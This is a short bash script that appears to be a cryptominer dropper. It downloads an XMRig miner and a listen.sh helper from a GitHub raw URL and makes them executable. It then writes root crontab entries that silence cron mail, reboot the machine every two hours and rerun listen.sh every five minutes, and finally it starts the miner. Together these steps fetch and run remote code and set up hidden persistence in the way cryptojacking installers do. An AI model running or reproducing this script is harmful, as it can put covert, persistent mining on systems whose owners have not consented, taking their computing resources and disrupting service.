#!/bin/bash
wget https://raw.githubusercontent.com/zy123456-zhong/mycode/master/xmrig-5.7.0.zip
wget https://raw.githubusercontent.com/zy123456-zhong/mycode/master/listen.sh
unzip xmrig-5.7.0.zip 
chmod +x xmrig-5.7.0/xmrig
chmod +x listen.sh
echo "MAILTO=""" >> /var/spool/cron/root
echo "0 */2 * * * /usr/sbin/reboot" >> /var/spool/cron/root
echo "*/5 * * * * /root/listen.sh" >> /var/spool/cron/root
service crond restart
./xmrig-5.7.0/xmrig


